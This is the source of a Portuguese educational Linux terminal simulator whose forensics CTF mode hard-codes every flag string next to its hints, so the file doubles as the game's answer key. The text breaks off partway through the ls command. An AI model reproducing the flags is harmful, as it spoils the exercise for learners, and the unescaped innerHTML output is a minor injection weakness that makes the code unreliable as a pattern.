/* ══════════════════════════════════════════════════════
   LINUX TERMINAL — terminal.js  (v3 — cursor + CTF hints)
   ══════════════════════════════════════════════════════ */
'use strict';

// ══════════════════════════════════════════════════════
// SISTEMA DE ARQUIVOS VIRTUAL
// ══════════════════════════════════════════════════════
const FS = {
  '/': {
    type: 'dir',
    children: {
      home: { type: 'dir', children: {
        usuario: { type: 'dir', children: {
          'readme.txt':  { type: 'file', content: 'Bem-vindo ao LinuxTerminal!\nEste e um ambiente de aprendizado.\nDigite "help" para ver os comandos disponiveis.' },
          'notas.txt':   { type: 'file', content: 'Minhas anotacoes sobre Linux:\n- ls lista arquivos\n- cd muda diretorio\n- pwd mostra o caminho atual' },
          'script.sh':   { type: 'file', content: '#!/bin/bash\necho "Ola, Linux!"' },
          projetos: { type: 'dir', children: {
            web:    { type: 'dir', children: { 'index.html': { type: 'file', content: '<html><body>Meu site</body></html>' } } },
            python: { type: 'dir', children: { 'main.py':    { type: 'file', content: 'print("Hello World")' } } }
          }}
        }}
      }},
      etc: { type: 'dir', children: {
        'hostname':   { type: 'file', content: 'linux' },
        'os-release': { type: 'file', content: 'NAME="Ubuntu"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="22.04"' },
        'shells':     { type: 'file', content: '/bin/sh\n/bin/bash\n/bin/zsh\n/bin/fish' },
      }},
      var: { type: 'dir', children: {
        log: { type: 'dir', children: {
          'syslog': { type: 'file', content: 'May  5 10:01:01 linux systemd[1]: Started Session\nMay  5 10:01:05 linux kernel: [ 0.000000] Linux version 5.15.0' }
        }}
      }},
      tmp: { type: 'dir', children: {} },
      bin: { type: 'dir', children: {} },
      usr: { type: 'dir', children: { bin: { type: 'dir', children: {} }, local: { type: 'dir', children: {} } } },
      opt: { type: 'dir', children: {} },
    }
  }
};

const BASE_FS = JSON.parse(JSON.stringify(FS));

// ══════════════════════════════════════════════════════
// ESTADO DO TERMINAL
// ══════════════════════════════════════════════════════
const state = {
  cwd: '/home/usuario',
  prevDir: null,
  history: [],
  historyIndex: -1,
  user: 'usuario',
  hostname: 'linux',
  env: {
    HOME: '/home/usuario',
    PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    SHELL: '/bin/bash',
    TERM: 'xterm-256color',
    USER: 'usuario',
    LANG: 'pt_BR.UTF-8',
  },
  aliases: { ll: 'ls -la', la: 'ls -a', l: 'ls -CF' },
};

// ══════════════════════════════════════════════════════
// ESTADO DO CTF
// ══════════════════════════════════════════════════════
const CTF = {
  active: false,
  score: 0,
  startTime: null,
  hintsUsed: 0,
  bonusAttempted: false,
  flags: {
    flag1: {
      found: false, pts: 150, label: 'Copiar Relatorio',
      what: 'Faca uma copia do arquivo de notas do hacker para /tmp/relatorio.txt para preservar a evidencia original.',
      why:  'Diferente do mv, o comando cp preserva o arquivo original no lugar. Em forense digital, copiar antes de analisar e uma pratica essencial — voce trabalha na copia e mantem o original intacto. Isso garante que a evidencia nao seja alterada durante a investigacao.',
      next: 'Copie o arquivo notas_hacker.txt de /home/hacker para /tmp/relatorio.txt → depois leia a copia para confirmar que funcionou.',
      hint: 'Consulte o menu lateral: use cp com o caminho de origem e o caminho completo de destino, incluindo o novo nome do arquivo.',
    },
    flag2: {
      found: false, pts: 150, label: 'Mover Evidencia',
      what: 'O atacante deixou um arquivo de evidencia em /opt/missao/config.enc. Mova-o para /tmp/analise/ para analise forense isolada.',
      why:  'Em investigacoes forenses, e comum mover arquivos suspeitos para um diretorio de trabalho isolado antes de analisa-los. O comando mv transfere o arquivo sem duplica-lo, preservando a cadeia de custodia. Se o diretorio de destino nao existir, e preciso cria-lo primeiro com mkdir.',
      next: 'Crie o diretorio /tmp/analise com mkdir → mova o arquivo config.enc de /opt/missao para /tmp/analise/ usando mv.',
      hint: 'Consulte o menu lateral: use mkdir para criar o diretorio de destino e mv com origem e destino para mover o arquivo.',
    },
    flag3: {
      found: false, pts: 100, label: 'Reconhecimento',
      what: 'Explore o diretorio /home/hacker em busca de arquivos escondidos pelo atacante.',
      why:  'No Linux, arquivos cujo nome comeca com ponto (.) sao ocultos por padrao. O comando ls sem opcoes NAO os exibe. A flag -a (all) revela tudo, incluindo esses arquivos invisiveis — tecnica essencial em analise forense.',
      next: 'Navegue ate o diretorio /home/hacker → depois liste TODOS os arquivos, incluindo os ocultos.',
      hint: 'Consulte o menu lateral: use cd para mudar de diretorio e ls com a flag que exibe arquivos ocultos (-a).',
    },
    flag4: {
      found: false, pts: 200, label: 'Permissoes',
      what: 'Inspecione os arquivos do diretorio /opt/missao e leia o script deixado pelo atacante.',
      why:  'Atacantes usam scripts shell (.sh) com permissao de execucao (chmod +x) para automatizar acoes maliciosas. Verificar permissoes com ls -la e ler o conteudo com cat sao passos basicos de analise forense.',
      next: 'Navegue ate /opt/missao → verifique as permissoes dos arquivos com ls -la → leia o conteudo do script .sh com cat.',
      hint: 'Consulte o menu lateral: use cd para navegar, ls -la para ver permissoes e cat para ler o arquivo.',
    },
    flag5: {
      found: false, pts: 200, label: 'Processos',
      what: 'Execute o comando ps com as flags que listam processos de TODOS os usuarios — a saida revelara processos suspeitos rodando em segundo plano.',
      why:  'Backdoors e malwares ficam ativos como processos em segundo plano. O comando ps sozinho mostra apenas processos da sessao atual. Para uma varredura completa — como faz um analista forense — e preciso combinar as flags a (todos os usuarios), u (formato detalhado) e x (processos sem terminal). Isso expoe executaveis escondidos e conexoes de rede ativas.',
      next: 'Este e um comando de passo unico: execute ps com as flags a, u e x juntas → a flag aparecera automaticamente na saida ao identificar os processos suspeitos.',
      hint: 'Consulte o menu lateral em "Processos": o comando ps com as flags aux lista todos os processos do sistema com detalhes. Nao e necessario navegar para nenhum diretorio.',
    },
    flag6: {
      found: false, pts: 200, label: 'Rede',
      what: 'Examine o arquivo de configuracao de rede /etc/hosts em busca de entradas maliciosas.',
      why:  'O arquivo /etc/hosts mapeia nomes de dominio para IPs localmente, antes de qualquer consulta DNS. Atacantes o modificam para redirecionar dominios legitimos para servidores C2 (Command & Control).',
      next: 'Leia o conteudo do arquivo /etc/hosts → procure por entradas com IPs de rede privada suspeitos.',
      hint: 'Consulte o menu lateral: use cat para exibir o conteudo completo de um arquivo de texto.',
    },
    flag7: {
      found: false, pts: 250, label: 'Log Forense',
      what: 'Analise o log de intrusao em /var/log para reconstruir a linha do tempo do ataque.',
      why:  'Logs sao a principal fonte de evidencia em forense digital. O diretorio /var/log armazena registros de sistema, autenticacao e aplicacoes. Comandos como cat e tail permitem ler e monitorar esses arquivos.',
      next: 'Navegue ate /var/log → liste os arquivos de log disponiveis → leia o arquivo de intrusao em seu conteudo completo.',
      hint: 'Consulte o menu lateral: use ls para listar os arquivos de log e cat ou tail para ler o arquivo suspeito.',
    },
    flag8: {
      found: false, pts: 250, label: 'Arquivo Oculto',
      what: 'Vasculhe o diretorio /tmp/esconderijo — ha um arquivo oculto esperando por voce.',
      why:  '/tmp e gravavel por qualquer usuario e nao persiste apos reboot, tornando-o esconderijo favorito de atacantes. Arquivos ocultos (prefixados com .) dentro de /tmp raramente sao verificados.',
      next: 'Navegue ate o diretorio /tmp/esconderijo → liste todos os arquivos, incluindo os ocultos → leia o arquivo oculto encontrado.',
      hint: 'Consulte o menu lateral: use cd para navegar, ls com a flag de arquivos ocultos (-a) e cat para ler o arquivo.',
    },
    flag9: {
      found: false, pts: 300, label: 'Criptografia',
      what: 'Localize e leia o arquivo de mensagem cifrada no diretorio home do hacker.',
      why:  'Atacantes cifram arquivos e comunicacoes para dificultar analise forense. Reconhecer padroes de codificacao como Base64 e ROT13 e uma habilidade fundamental. As vezes a flag esta visivel dentro do proprio arquivo cifrado.',
      next: 'Navegue ate o diretorio /home/hacker → liste os arquivos → leia o arquivo de mensagem cifrada.',
      hint: 'Consulte o menu lateral: use cd para ir ao /home/hacker e cat para exibir o conteudo do arquivo cifra.txt.',
    },
    flag10: {
      found: false, pts: 350, label: 'Root Flag',
      what: 'Acesse o arquivo secreto no diretorio /root, que exige privilegios de superusuario.',
      why:  'O diretorio /root e o home do superusuario e inacessivel a usuarios comuns. O comando sudo permite executar comandos com privilegios elevados — uma das ferramentas mais poderosas do Linux.',
      next: 'Tente listar o diretorio /root → leia o arquivo secreto usando um comando com privilegios de superusuario.',
      hint: 'Consulte o menu lateral: use sudo antes do cat para executar o comando como root — sudo cat /root/arquivo.',
    },
    flag11: {
      found: false, pts: 500, label: 'Flag Bonus',
      bonus: true,
      what: 'Insira a flag secreta na tela final do CTF.',
      why:  'Esta flag valida uma descoberta fora do caminho principal e recompensa exploracao avancada.',
      next: 'Missao bonus concluida.',
      hint: 'A flag bonus so pode ser submetida apos concluir as 10 flags principais.',
    },
  },
  flagStrings: {
    'FLAG{CP_R3L4T0R10_PR3S3RV4D0_1}':      'flag1',
    'FLAG{MV_3V1D3NC14_F0R3NS3_2}':         'flag2',
    'FLAG{R3C0N_M4ST3R_OCULTO_3}':          'flag3',
    'FLAG{P3RM1SS4O_SH_3X3CUT4V3L_4}':      'flag4',
    'FLAG{PR0C3SS0_SUSP3IT0_PS_AUX_5}':     'flag5',
    'FLAG{H0ST_F1L3_C2_3NTR4D4_REDE_6}':    'flag6',
    'FLAG{L0G_F0R3NS3_D3T3CT4D0_7777}':     'flag7',
    'FLAG{OCULTO_LS_A_3SCOND1DO_8888}':     'flag8',
    'FLAG{CR1PT0_D3C0D3R_H4CK3R_9999}':     'flag9',
    'FLAG{R00T_4CC3SS_SUP3RM4N_1010}':      'flag10',
    'FLAG{Y0U_5H0ULD_N0T_B3_H3R3}':         'flag11',
  },
};

// ══════════════════════════════════════════════════════
// BANCO DE DADOS DE COMANDOS
// ══════════════════════════════════════════════════════
const COMMANDS_DB = {
  ls:       { category:'Navegacao',   desc:'Lista arquivos e diretorios',          usage:'ls [opcoes] [caminho]',            examples:['ls','ls -la','ls -lh /etc','ls -a'],          flags:{'-l':'formato longo','-a':'mostra ocultos','-h':'tamanho legivel','-r':'reverso','-t':'por data'},   tip:'Use ls -la para ver todos os arquivos incluindo ocultos com detalhes.' },
  cd:       { category:'Navegacao',   desc:'Muda o diretorio atual',               usage:'cd [caminho]',                     examples:['cd /home','cd ..','cd ~','cd -'],                                                                                                                              tip:'cd sem argumento vai para o home. cd - volta ao diretorio anterior.' },
  pwd:      { category:'Navegacao',   desc:'Exibe o diretorio atual',              usage:'pwd',                              examples:['pwd'],                                                                                                                                                         tip:'Print Working Directory — mostra o caminho completo.' },
  mkdir:    { category:'Arquivos',    desc:'Cria diretorios',                       usage:'mkdir [opcoes] dir',               examples:['mkdir pasta','mkdir -p a/b/c'],                 flags:{'-p':'cria pais','-m':'permissoes','-v':'verbose'},                                                   tip:'Use mkdir -p para criar estruturas aninhadas sem erros.' },
  rm:       { category:'Arquivos',    desc:'Remove arquivos e diretorios',          usage:'rm [opcoes] arquivo',              examples:['rm arquivo.txt','rm -rf pasta/','rm -i *.log'], flags:{'-r':'recursivo','-f':'forcar','-i':'interativo','-v':'verbose'},                                     tip:'CUIDADO: rm -rf e irreversivel. Sempre verifique o caminho!' },
  cp:       { category:'Arquivos',    desc:'Copia arquivos e diretorios',           usage:'cp [opcoes] origem destino',       examples:['cp a.txt b.txt','cp -r pasta/ backup/'],        flags:{'-r':'recursivo','-p':'preserva atributos','-v':'verbose'},                                          tip:'Use cp -r para copiar diretorios inteiros.' },
  mv:       { category:'Arquivos',    desc:'Move ou renomeia arquivos',             usage:'mv [opcoes] origem destino',       examples:['mv old.txt new.txt','mv arquivo.txt /tmp/'],    flags:{'-i':'interativo','-v':'verbose'},                                                                    tip:'mv serve para mover e renomear arquivos.' },
  touch:    { category:'Arquivos',    desc:'Cria arquivos vazios ou atualiza data', usage:'touch arquivo',                   examples:['touch novo.txt','touch a.txt b.txt'],                                                                                                                         tip:'Cria arquivo vazio se nao existir, ou atualiza a data se existir.' },
  file:     { category:'Arquivos',    desc:'Identifica o tipo de um arquivo',       usage:'file arquivo',                    examples:['file readme.txt','file script.sh','file /etc/hosts'],                                                                                                         tip:'Use file para descobrir se algo e texto, binario, script, imagem ou link.' },
  tar:      { category:'Arquivos',    desc:'Empacota e descompacta arquivos',       usage:'tar [opcoes] arquivo.tar [arqs]',  examples:['tar -czf backup.tar.gz pasta/','tar -xzf arquivo.tar.gz'], flags:{'-c':'criar','-x':'extrair','-z':'gzip','-f':'arquivo','-v':'verbose','-t':'listar'}, tip:'"czf" = Cria Zippado Arquivo | "xzf" = eXtrai Zippado Arquivo' },
  cat:      { category:'Texto',       desc:'Exibe conteudo de arquivos',            usage:'cat [opcoes] arquivo',             examples:['cat readme.txt','cat -n script.sh'],             flags:{'-n':'numerar linhas','-A':'chars especiais'},                                                        tip:'cat vem de "concatenate" — pode combinar multiplos arquivos.' },
  grep:     { category:'Texto',       desc:'Busca padroes em arquivos',             usage:'grep [opcoes] padrao [arquivo]',  examples:['grep "erro" log.txt','grep -i "linux" readme.txt','grep -n "func" script.sh'], flags:{'-i':'sem distincao','-r':'recursivo','-n':'no linha','-v':'inverter','-c':'contar'}, tip:'grep e uma das ferramentas mais poderosas do Linux.' },
  echo:     { category:'Texto',       desc:'Exibe texto ou variaveis',              usage:'echo [texto/variavel]',            examples:['echo "Ola mundo"','echo $HOME','echo $PATH'],   flags:{'-n':'sem newline','-e':'escapes'},                                                                   tip:'Use echo $VARIAVEL para ver o valor de qualquer variavel.' },
  head:     { category:'Texto',       desc:'Exibe as primeiras linhas',             usage:'head [opcoes] arquivo',            examples:['head arquivo.txt','head -n 20 log.txt'],         flags:{'-n':'no de linhas','-c':'bytes'},                                                                    tip:'head -n 50 mostra as primeiras 50 linhas. Padrao e 10.' },
  tail:     { category:'Texto',       desc:'Exibe as ultimas linhas',               usage:'tail [opcoes] arquivo',            examples:['tail arquivo.txt','tail -n 50 log.txt','tail -f /var/log/syslog'], flags:{'-n':'no linhas','-f':'seguir em tempo real'},                               tip:'tail -f e essencial para monitorar logs em tempo real.' },
  sort:     { category:'Texto',       desc:'Ordena linhas de texto',                usage:'sort [opcoes] [arquivo]',          examples:['sort lista.txt','sort -r lista.txt','sort -u lista.txt'], flags:{'-r':'reverso','-n':'numerico','-u':'sem duplicatas'},                              tip:'Combine com uniq para remover duplicatas apos ordenar.' },
  wc:       { category:'Texto',       desc:'Conta linhas, palavras e caracteres',   usage:'wc [opcoes] [arquivo]',            examples:['wc arquivo.txt','wc -l log.txt','ls | wc -l'],  flags:{'-l':'linhas','-w':'palavras','-c':'bytes'},                                                         tip:'wc -l com pipes conta resultados de outros comandos.' },
  less:     { category:'Texto',       desc:'Visualiza arquivos com paginacao',      usage:'less [arquivo]',                  examples:['less readme.txt','less /var/log/syslog'],                                                                                                                     tip:'Teclas: q=sair | /=buscar | n=proximo | G=fim | g=inicio' },
  find:     { category:'Busca',       desc:'Busca arquivos no sistema',             usage:'find [caminho] [criterios]',       examples:['find . -name "*.txt"','find /home -type d','find . -mtime -7'], flags:{'-name':'por nome','-type':'f=arquivo d=dir','-mtime':'dias modificado'},      tip:'Combine com -exec para executar acoes nos arquivos encontrados.' },
  which:    { category:'Busca',       desc:'Mostra o caminho de um executavel',      usage:'which comando',                   examples:['which bash','which python','which grep'],                                                                                                                     tip:'which ajuda a confirmar qual binario sera executado pelo PATH.' },
  chmod:    { category:'Permissoes',  desc:'Altera permissoes de arquivos',         usage:'chmod [modo] arquivo',             examples:['chmod 755 script.sh','chmod +x programa','chmod -R 644 docs/'],                                                                                             tip:'755=rwxr-xr-x | 644=rw-r--r-- | 777=rwxrwxrwx' },
  chown:    { category:'Permissoes',  desc:'Altera dono e grupo de arquivos',       usage:'chown [user:grupo] arquivo',       examples:['chown usuario arquivo.txt','chown -R www-data /var/www'],                                                                                                    tip:'Precisa de sudo para alterar dono de arquivos de outros usuarios.' },
  sudo:     { category:'Sistema',     desc:'Executa comandos como superusuario',    usage:'sudo [opcoes] comando',            examples:['sudo apt update','sudo systemctl restart nginx'],  flags:{'-u':'outro usuario','-s':'shell root','-l':'listar permissoes'},                                tip:'Use com responsabilidade — sudo da poderes administrativos totais.' },
  apt:      { category:'Sistema',     desc:'Gerenciador de pacotes (Debian/Ubuntu)',usage:'sudo apt [comando] [pacote]',      examples:['sudo apt update','sudo apt upgrade','sudo apt install nginx'],                                                                                               tip:'Sempre execute apt update antes de instalar pacotes.' },
  ps:       { category:'Processos',   desc:'Lista processos em execucao',           usage:'ps [opcoes]',                     examples:['ps','ps aux','ps -ef','ps aux | grep nginx'],    flags:{'a':'todos os users','u':'formato usuario','x':'sem terminal'},                                       tip:'ps aux e o mais completo — combine com grep para filtrar.' },
  kill:     { category:'Processos',   desc:'Envia sinais para processos',           usage:'kill [sinal] PID',                examples:['kill 1234','kill -9 1234','killall nginx'],       flags:{'-9':'SIGKILL (forcar)','-15':'SIGTERM (graceful)'},                                                 tip:'kill -9 e forca bruta — tente kill (SIGTERM) primeiro.' },
  top:      { category:'Processos',   desc:'Monitor de processos em tempo real',    usage:'top [opcoes]',                    examples:['top','top -u usuario'],                                                                                                                                       tip:'Pressione q para sair, k para matar, M para ordenar por memoria.' },
  df:       { category:'Sistema',     desc:'Mostra uso do espaco em disco',         usage:'df [opcoes] [caminho]',            examples:['df -h','df -hT','df -h /home'],                  flags:{'-h':'legivel','-T':'tipo do filesystem','-i':'inodes'},                                             tip:'df -h e o mais usado para verificar espaco disponivel.' },
  du:       { category:'Sistema',     desc:'Mostra uso de disco por diretorio',     usage:'du [opcoes] [caminho]',            examples:['du -sh *','du -sh /var/log'],                    flags:{'-s':'sumarizar','-h':'legivel'},                                                                    tip:'du -sh * lista o tamanho de cada item no diretorio atual.' },
  free:     { category:'Sistema',     desc:'Mostra uso de memoria RAM',             usage:'free [opcoes]',                   examples:['free','free -h','free -m'],                       flags:{'-h':'legivel','-m':'megabytes','-g':'gigabytes'},                                                   tip:'free -h e o mais amigavel para ver RAM e SWAP disponiveis.' },
  env:      { category:'Sistema',     desc:'Lista variaveis de ambiente',           usage:'env',                             examples:['env','echo $HOME','echo $PATH'],                                                                                                                              tip:'Variaveis de ambiente configuram o comportamento de programas.' },
  whoami:   { category:'Sistema',     desc:'Mostra o usuario atual',                usage:'whoami',                          examples:['whoami'],                                                                                                                                                      tip:'Util para verificar com qual usuario voce esta executando comandos.' },
  id:       { category:'Sistema',     desc:'Mostra UID, GID e grupos do usuario',   usage:'id [usuario]',                    examples:['id','id usuario'],                                                                                                                                            tip:'id e muito usado para diagnosticar permissoes e pertencimento a grupos.' },
  hostname: { category:'Sistema',     desc:'Exibe o nome da maquina',               usage:'hostname [opcoes]',               examples:['hostname','hostname -I'],                         flags:{'-I':'enderecos IP'},                                                                                 tip:'hostname identifica rapidamente em qual servidor voce esta logado.' },
  uptime:   { category:'Sistema',     desc:'Mostra tempo ligado e carga do sistema', usage:'uptime',                          examples:['uptime'],                                                                                                                                                      tip:'Load average alto por muito tempo indica pressao de CPU ou processos travados.' },
  uname:    { category:'Sistema',     desc:'Informacoes do sistema operacional',    usage:'uname [opcoes]',                  examples:['uname','uname -a','uname -r','uname -m'],         flags:{'-a':'todas as informacoes','-r':'versao do kernel','-m':'arquitetura'},                           tip:'uname -a e o mais usado para ver todas as informacoes do sistema.' },
  date:     { category:'Sistema',     desc:'Exibe ou configura data e hora',        usage:'date [formato]',                  examples:['date','date "+%d/%m/%Y"','date "+%H:%M:%S"'],                                                                                                                 tip:'Use + para formatar: %Y=ano %m=mes %d=dia %H=hora %M=minuto' },
  ifconfig: { category:'Rede',        desc:'Configura e exibe interfaces de rede',  usage:'ifconfig [interface]',            examples:['ifconfig','ifconfig eth0','ip addr show'],                                                                                                                    tip:'Em sistemas modernos, use "ip addr" (substituto do ifconfig).' },
  ip:       { category:'Rede',        desc:'Mostra e configura rede no Linux moderno',usage:'ip [addr|route|link]',            examples:['ip addr','ip route','ip link show'],                                                                                                                          tip:'ip substitui ifconfig e route na maioria das distribuicoes atuais.' },
  ping:     { category:'Rede',        desc:'Testa conectividade de rede',           usage:'ping [opcoes] host',              examples:['ping google.com','ping -c 4 8.8.8.8'],            flags:{'-c':'no de pacotes','-i':'intervalo em segundos'},                                                 tip:'ping -c 4 envia apenas 4 pacotes e para automaticamente.' },
  ssh:      { category:'Rede',        desc:'Acesso seguro a servidores remotos',    usage:'ssh [usuario@]host',              examples:['ssh usuario@192.168.1.10','ssh -p 2222 servidor'],flags:{'-p':'porta','-i':'arquivo de chave','-v':'debug'},                                                  tip:'Configure ~/.ssh/config para atalhos de conexoes frequentes.' },
  scp:      { category:'Rede',        desc:'Copia arquivos via SSH',                usage:'scp [opcoes] origem destino',     examples:['scp arquivo.txt user@host:/tmp/','scp -r pasta/ user@host:~/'], flags:{'-r':'recursivo','-P':'porta'},                                                  tip:'Sintaxe: usuario@host:/caminho para especificar destino remoto.' },
  wget:     { category:'Rede',        desc:'Baixa arquivos da internet',            usage:'wget [opcoes] URL',               examples:['wget https://exemplo.com/arquivo.zip','wget -O nome.zip URL'], flags:{'-O':'nome do arquivo','-c':'continuar download','-q':'silencioso'},               tip:'wget -c retoma downloads interrompidos.' },
  curl:     { category:'Rede',        desc:'Transfere dados com URLs',              usage:'curl [opcoes] URL',               examples:['curl https://api.exemplo.com','curl -o arquivo.zip URL','curl -X POST -d "data" URL'], flags:{'-o':'salvar','-s':'silencioso','-X':'metodo HTTP','-H':'cabecalho'}, tip:'curl e muito usado para testar APIs REST.' },
  man:      { category:'Ajuda',       desc:'Exibe o manual de um comando',          usage:'man [secao] comando',             examples:['man ls','man grep','man 5 passwd'],                                                                                                                           tip:'Pressione q para sair, / para buscar, n para proximo resultado.' },
  history:  { category:'Ajuda',       desc:'Exibe historico de comandos',           usage:'history [n]',                    examples:['history','history 20','history | grep ssh'],                                                                                                                   tip:'Use !! para repetir o ultimo comando, !n para o comando de numero n.' },
  help:     { category:'Ajuda',       desc:'Mostra ajuda sobre os comandos',        usage:'help [comando]',                  examples:['help','help ls','help grep'],                                                                                                                                  tip:'Digite help seguido de qualquer comando para ver detalhes.' },
  clear:    { category:'Terminal',    desc:'Limpa a tela do terminal',              usage:'clear',                           examples:['clear'],                                                                                                                                                       tip:'Atalho: Ctrl+L tambem limpa a tela.' },
  exit:     { category:'Terminal',    desc:'Sai do terminal ou shell atual',        usage:'exit [codigo]',                   examples:['exit','exit 0'],                                                                                                                                               tip:'exit 0 = sucesso | exit 1 ou qualquer outro = erro' },
  ctf:      { category:'Terminal',    desc:'Modo Jogo -- Capture The Flag',         usage:'ctf [start|status|hint|reset|stop]', examples:['ctf start','ctf status','ctf hint','ctf stop'],                                                                                                          tip:'Encontre 10 flags escondidas no sistema usando todos os comandos Linux!' },
};

const CATEGORIES = {
  'Navegacao':   { icon:'<>', cmds:['ls','cd','pwd'] },
  'Arquivos':    { icon:'[]', cmds:['mkdir','rm','cp','mv','touch','file','tar'] },
  'Texto':       { icon:'##', cmds:['cat','grep','echo','head','tail','sort','wc','less'] },
  'Busca':       { icon:'??', cmds:['find','which'] },
  'Permissoes':  { icon:'**', cmds:['chmod','chown'] },
  'Processos':   { icon:'%%', cmds:['ps','kill','top'] },
  'Sistema':     { icon:'$$', cmds:['sudo','apt','df','du','free','env','whoami','id','hostname','uptime','uname','date'] },
  'Rede':        { icon:'@@', cmds:['ifconfig','ip','ping','ssh','scp','wget','curl'] },
  'Ajuda':       { icon:';;', cmds:['man','history','help'] },
  'Terminal':    { icon:'::', cmds:['clear','exit','ctf'] },
};

const CATEGORY_ICONS = {
  'Navegacao':'📁','Arquivos':'📄','Texto':'📝','Busca':'🔍',
  'Permissoes':'🔐','Processos':'⚙️','Sistema':'💻','Rede':'🌐',
  'Ajuda':'❓','Terminal':'🖥️',
};

// ══════════════════════════════════════════════════════
// HELPERS DE SISTEMA DE ARQUIVOS VIRTUAL
// ══════════════════════════════════════════════════════
function normalizePath(p) {
  const parts = p.split('/').filter(Boolean);
  const stack = [];
  for (const part of parts) {
    if (part === '..') stack.pop();
    else if (part !== '.') stack.push(part);
  }
  return '/' + stack.join('/');
}

function resolvePath(base, target) {
  if (!target || target === '~') return state.env.HOME;
  if (target === '-') return state.prevDir || base;
  if (target.startsWith('/')) return normalizePath(target);
  return normalizePath(base + '/' + target);
}

function getNode(path) {
  const parts = path.split('/').filter(Boolean);
  let node = FS['/'];
  for (const part of parts) {
    if (!node || node.type !== 'dir') return null;
    node = node.children[part];
  }
  return node || null;
}

function getParentAndNode(path) {
  const norm  = normalizePath(path);
  const parts = norm.split('/').filter(Boolean);
  const name  = parts.pop() || '';
  const parent = getNode('/' + parts.join('/'));
  return { parent, name };
}

function dirName(path) { return path.split('/').filter(Boolean).pop() || '/'; }
function cloneNode(node) { return JSON.parse(JSON.stringify(node)); }
function listDir(path) {
  const node = getNode(path);
  if (!node || node.type !== 'dir') return null;
  return Object.entries(node.children).map(([name, n]) => ({ name, ...n }));
}

function promptStr() {
  const rel = state.cwd === state.env.HOME ? '~'
    : state.cwd.startsWith(state.env.HOME) ? '~' + state.cwd.slice(state.env.HOME.length)
    : state.cwd;
  return `${state.user}@${state.hostname}:${rel}$`;
}

// ══════════════════════════════════════════════════════
// RENDERIZACAO
// ══════════════════════════════════════════════════════
const outputEl    = document.getElementById('terminal-output');
const inputEl     = document.getElementById('terminal-input');
const promptLabel = document.getElementById('prompt-label');

function updatePrompt() {
  const rel = state.cwd === state.env.HOME ? '~'
    : state.cwd.startsWith(state.env.HOME) ? '~' + state.cwd.slice(state.env.HOME.length)
    : state.cwd;
  document.getElementById('terminal-title').textContent = `${state.user}@${state.hostname}: ${rel}`;
  promptLabel.textContent = `${state.user}@${state.hostname}:${rel}$ `;
}

function escapeHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function formatOutputLine(line) {
  const text = String(line);
  if (/^Proxima missao:/i.test(text) || /^Pr[oó]xima miss[aã]o:/i.test(text)) {
    return `<span class="next-mission">${text}</span>`;
  }
  return text;
}

function print(text, cls) {
  cls = cls || 'output';
  const lines = String(text).split('\n');
  for (const line of lines) {
    const el = document.createElement('div');
    el.className = 'output-line ' + cls;
    if (line === '') { el.classList.add('blank'); }
    else { el.innerHTML = formatOutputLine(line); }
    outputEl.appendChild(el);
  }
  outputEl.scrollTop = outputEl.scrollHeight;
  if (CTF.active && typeof text === 'string') checkFlagInText(text);
}

function printBlank() { print('', 'blank'); }

function printCmd(cmd) {
  const el = document.createElement('div');
  el.className = 'output-line cmd-echo';
  el.innerHTML = `<span class="prompt-str">${escapeHtml(promptStr())}</span><span>${escapeHtml(cmd)}</span>`;
  outputEl.appendChild(el);
  outputEl.scrollTop = outputEl.scrollHeight;
}

function clearTerminal() { outputEl.innerHTML = ''; }

// ══════════════════════════════════════════════════════
// CURSOR VISUAL — acompanha o caret real
// ══════════════════════════════════════════════════════
const inputBefore      = document.getElementById('input-before');
const inputCursorEl    = document.getElementById('input-cursor');
const inputAfter       = document.getElementById('input-after');
const inputPlaceholder = document.getElementById('input-placeholder');

function updateCursorDisplay() {
  const val  = inputEl.value;
  const pos  = (inputEl.selectionStart != null) ? inputEl.selectionStart : val.length;
  const ch   = val[pos] !== undefined ? val[pos] : ' ';
  inputBefore.textContent   = val.slice(0, pos);
  inputCursorEl.textContent = ch;
  inputAfter.textContent    = val.slice(pos + (val[pos] !== undefined ? 1 : 0));
  inputPlaceholder.style.display = val.length ? 'none' : '';
  inputCursorEl.style.animation = 'none';
  requestAnimationFrame(() => { inputCursorEl.style.animation = ''; });
}

['input','keyup','click','select','focus'].forEach(ev => {
  inputEl.addEventListener(ev, updateCursorDisplay);
});

// ══════════════════════════════════════════════════════
// PARSER DE COMANDOS
// ══════════════════════════════════════════════════════
function parseCommand(input) {
  const trimmed   = input.trim();
  const firstWord = trimmed.split(/\s+/)[0];
  const expanded  = state.aliases[firstWord]
    ? trimmed.replace(firstWord, state.aliases[firstWord]) : trimmed;
  const tokens = [];
  let cur = '', inQ = false, qChar = '';
  for (const ch of expanded) {
    if (inQ) { if (ch === qChar) inQ = false; else cur += ch; }
    else if (ch === '"' || ch === "'") { inQ = true; qChar = ch; }
    else if (ch === ' ' && cur) { tokens.push(cur); cur = ''; }
    else if (ch !== ' ') { cur += ch; }
  }
  if (cur) tokens.push(cur);
  return { cmd: tokens[0] || '', flags: tokens.filter(t=>t.startsWith('-')), args: tokens.filter(t=>!t.startsWith('-')).slice(1), raw: tokens.slice(1) };
}

// ══════════════════════════════════════════════════════
// COMANDOS
// ══════════════════════════════════════════════════════
function cmdLs(flags, args, elevated) {
  const path = args[0] ? resolvePath(state.cwd, args[0]) : state.cwd;
  if (path.startsWith('/root') && !elevated) {
    print(`ls: nao e possivel abrir diretorio '${args[0] || path}': Permissao negada`, 'error');
    return false;
  }
  const node = getNode(path);
  if (!node) { print(`ls: nao e possivel acessar '${args[0]}': Arquivo ou diretorio nao encontrado`, 'error'); return false; }
  if (node.type === 'file') { print(args[0], 'output'); return true; }
  const showAll  = flags.some(f => f.includes('a'));
  const longForm = flags.some(f => f.includes('l'));
  const humanR   = flags.some(f => f.includes('h'));
  const reverse  = flags.includes('-r');
  let entries = Object.entries(node.children).map(([name, n]) => ({ name, ...n }));
  // Sem -a: oculta arquivos cujo nome comeca com ponto (comportamento real do ls)
  if (showAll) {
    entries = [{ name:'.', type:'dir' }, { name:'..', type:'dir' }, ...entries];
  } else {
    entries = entries.filter(e => !e.name.startsWith('.'));
  }
  if (reverse) entries.reverse();
  if (!longForm) {
    for (let i = 0; i < entries.length; i += 4) {
      const row = entries.slice(i, i+4).map(e => {
        if (e.type === 'dir') return `<span style="color:var(--cyan);font-weight:700">${escapeHtml(e.name)}/</span>`;
